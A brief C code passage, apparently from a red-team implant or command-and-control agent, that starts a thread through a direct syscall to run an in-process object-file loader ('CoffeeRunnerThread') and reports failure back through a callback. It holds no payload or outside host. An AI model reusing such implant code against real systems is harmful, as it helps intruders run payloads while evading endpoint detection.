    if ( ! ThreadCreate( DX_THREAD_SYSCALL, NtCurrentProcess(), CoffeeRunnerThread, &InjectionCtx ) )
    {
        PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
        CALLBACK_GETLASTERROR
    }
}